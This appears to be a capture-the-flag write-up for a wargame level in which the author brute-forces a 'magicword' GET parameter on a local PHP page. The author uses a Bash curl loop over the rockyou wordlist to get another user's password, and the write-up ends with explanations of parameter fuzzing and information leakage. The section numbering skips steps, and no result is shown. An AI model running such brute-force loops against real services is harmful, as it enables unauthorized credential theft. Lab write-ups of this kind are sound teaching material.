# 0x31

moving from `halcyon` to `hebe`

The mission for this stage focused on user **hebe** and an internal web application used for password retrieval:

```bash
halcyon@hades:~$ cat mission.txt 
################
# MISSION 0x31 #
################

## EN ##
The user hebe has one 'magicword' to get her password using http://localhost/req.php

## ES ##
La usuaria hebe tiene una 'magicword' para obtener su password usando http://localhost/req.php
```

### 1. Initial Reconnaissance

I started by interacting with the local web service mentioned in the mission. A standard request returned a negative response:

```bash
halcyon@hades:~$ curl localhost/req.php
NO... 
```

I checked the filesystem to locate the source code and potential wordlists. I found the PHP file in the web root and a large directory of wordlists in `/var/tmp/`:

```bash
halcyon@hades:~$ ls -la /var/www/html/req.php
-rw------- 1 www-data www-data  106 Aug 31  1992 /var/www/html/req.php

halcyon@hades:~$ ls -la /var/tmp/rock
total 136664
drwxr-xr-x 2 ianthe ianthe      4096 Mar 14  2025 .
-rw-r--r-- 1 ianthe ianthe 139921497 Mar 14  2025 rockyou.txt
```

### 2. Parameter Fuzzing (Brute Force)

The hint mentioned a "magicword." This typically implies a GET or POST parameter. Based on the mission, I needed to find which word from a dictionary would trigger the password release.

I utilized a simple `while` loop in Bash to iterate through the `rockyou.txt` wordlist, sending a GET request for each word as the value of the `magicword` parameter:

```bash
halcyon@hades:/var/tmp/rock$ while read i; do 
  res=$(curl -s "http://localhost/req.php?magicword=$i"); 
  if [[ "$res" != *"NO..."* ]]; then 
    echo -e "\n[+] Found! Word: $i\n[+] Response: $res"; 
    break; 
  fi; 
done < /var/tmp/rock/rockyou.txt
```

### 5. Explanation

* **Parameter Fuzzing**: This is a technique used to discover hidden parameters or valid inputs in a web application. By automating thousands of requests with different inputs, we can identify "hidden" logic that only triggers when a specific value is provided.
* **Localhost Web Services**: Often, CTF machines run internal-only services (bound to `127.0.0.1`) that contain sensitive information or administrative tools. These cannot be accessed from an outside network but are vulnerable once you have established a local shell.
* **Information Leakage**: The `req.php` script was configured to release a user's system password based on a simple matching logic. In a real-world scenario, this represents a critical vulnerability where an insecurely designed "password recovery" or "API key" endpoint leaks credentials.
